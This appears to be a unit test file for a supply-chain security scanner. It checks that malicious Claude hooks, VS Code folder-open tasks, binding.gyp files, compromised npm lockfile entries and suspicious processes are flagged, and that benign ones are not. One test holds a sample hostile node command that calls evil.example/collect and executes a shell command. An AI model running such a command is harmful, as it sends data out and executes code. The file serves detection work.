import json
import subprocess
import unittest
from pathlib import Path
from typing import Optional
from unittest.mock import patch

import scanner


FIXTURES = Path(__file__).parent / "corpus"


class ScannerCorpusTests(unittest.TestCase):
    def tearDown(self):
        scanner.clear_findings()

    def run_fixture_scan(self, home_fixture: str, workspace_fixture: Optional[str] = None):
        home = FIXTURES / home_fixture
        workspace = FIXTURES / workspace_fixture if workspace_fixture else home
        with patch("pathlib.Path.home", return_value=home):
            return scanner.run_scan([workspace], include_processes=False, include_test_paths=True)

    def severities(self, findings):
        return {finding["severity"] for finding in findings}

    def test_benign_workspace_stays_quiet(self):
        findings = self.run_fixture_scan("safe_home", "benign_workspace")
        actionable = [f for f in findings if f["severity"] != "INFO"]
        self.assertEqual(actionable, [], findings)

    def test_malicious_claude_hook_is_critical(self):
        findings = self.run_fixture_scan("malicious_hook_home", "benign_workspace")
        self.assertIn("CRITICAL", self.severities(findings))
        self.assertTrue(
            any(f["category"] == "claude_settings" for f in findings),
            findings,
        )

    def test_safe_sessionstart_hook_is_not_flagged(self):
        findings = self.run_fixture_scan("safe_hook_home", "benign_workspace")
        actionable = [f for f in findings if f["severity"] != "INFO"]
        self.assertEqual(actionable, [], findings)

    def test_malicious_vscode_folderopen_task_is_critical(self):
        findings = self.run_fixture_scan("safe_home", "malicious_vscode_workspace")
        self.assertIn("CRITICAL", self.severities(findings))
        self.assertTrue(
            any(f["category"] == "vscode_tasks" for f in findings),
            findings,
        )

    def test_safe_vscode_folderopen_task_is_not_flagged(self):
        findings = self.run_fixture_scan("safe_home", "benign_workspace")
        self.assertFalse(any(f["category"] == "vscode_tasks" for f in findings), findings)

    def test_jsonc_vscode_tasks_with_trailing_comma_is_not_flagged(self):
        findings = self.run_fixture_scan("safe_home", "jsonc_workspace")
        self.assertFalse(any(f["category"] == "vscode_tasks" for f in findings), findings)

    def test_malicious_binding_gyp_is_flagged(self):
        findings = self.run_fixture_scan("safe_home", "malicious_binding_workspace")
        self.assertTrue(
            any(f["category"] == "binding_gyp" for f in findings),
            findings,
        )

    def test_benign_binding_gyp_is_not_flagged(self):
        findings = self.run_fixture_scan("safe_home", "benign_binding_workspace")
        self.assertFalse(any(f["category"] == "binding_gyp" for f in findings), findings)

    def test_affected_package_in_lockfile_is_critical(self):
        findings = self.run_fixture_scan("safe_home", "malicious_lockfile_workspace")
        self.assertIn("CRITICAL", self.severities(findings))
        self.assertTrue(
            any(f["category"] == "npm_package" for f in findings),
            findings,
        )

    def test_json_report_contains_summary(self):
        with patch("pathlib.Path.home", return_value=FIXTURES / "safe_home"):
            scanner.run_scan([FIXTURES / "malicious_vscode_workspace"], include_processes=False)
            payload = {
                "findings": sorted(scanner.findings, key=lambda f: scanner.SEV_ORDER.get(f["severity"], 99)),
                "summary": {s: 0 for s in scanner.SEV_ORDER},
            }
            for item in scanner.findings:
                payload["summary"][item["severity"]] = payload["summary"].get(item["severity"], 0) + 1
            encoded = json.dumps(payload)
            self.assertIn('"summary"', encoded)
            self.assertIn('"findings"', encoded)

    def test_cli_without_run_prints_help(self):
        result = subprocess.run(
            ["python3", "scanner.py"],
            cwd=Path(__file__).resolve().parent.parent,
            capture_output=True,
            text=True,
            check=False,
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("usage: scanner.py", result.stdout)
        self.assertIn("--run", result.stdout)

    def test_cli_default_scan_skips_fixture_corpus(self):
        result = subprocess.run(
            ["python3", "scanner.py", "--run", "--json", "--no-processes", "."],
            cwd=Path(__file__).resolve().parent.parent,
            capture_output=True,
            text=True,
            check=False,
        )
        self.assertEqual(result.returncode, 0, result.stdout)
        payload = json.loads(result.stdout)
        actionable = [f for f in payload["findings"] if f["severity"] != "INFO"]
        self.assertEqual(actionable, [], payload)

    def test_process_scan_ignores_benign_electron_utility_process(self):
        ps_output = (
            "USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND\n"
            "demonic 15216 0.0 0.0 33947024 18256 ? Sl 06:00 0:18 /proc/self/exe --type=utility --utility-sub-type=node.mojom.NodeService\n"
        )
        with (
            patch("scanner.subprocess.run") as mock_run,
            patch("scanner.read_cmdline_for_pid", return_value="/proc/self/exe --type=utility --utility-sub-type=node.mojom.NodeService --lang=en-US"),
        ):
            mock_run.return_value = subprocess.CompletedProcess(
                args=["ps", "aux"],
                returncode=0,
                stdout=ps_output,
                stderr="",
            )
            scanner.clear_findings()
            scanner.check_processes()
            self.assertFalse(any(f["category"] == "process" for f in scanner.findings), scanner.findings)

    def test_process_scan_reports_exact_matching_command(self):
        ps_output = (
            "USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND\n"
            "demonic 4123 0.0 0.0 1000 1000 ? Sl 06:00 0:00 node -e something\n"
        )
        command = "node -e \"fetch('https://evil.example/collect'); require('child_process').exec('id')\""
        with (
            patch("scanner.subprocess.run") as mock_run,
            patch("scanner.read_cmdline_for_pid", return_value=command),
        ):
            mock_run.return_value = subprocess.CompletedProcess(
                args=["ps", "aux"],
                returncode=0,
                stdout=ps_output,
                stderr="",
            )
            scanner.clear_findings()
            scanner.check_processes()
            process_findings = [f for f in scanner.findings if f["category"] == "process"]
            self.assertEqual(len(process_findings), 1, scanner.findings)
            self.assertIn("fetch('https://evil.example/collect')", process_findings[0]["snippet"])


if __name__ == "__main__":
    unittest.main()
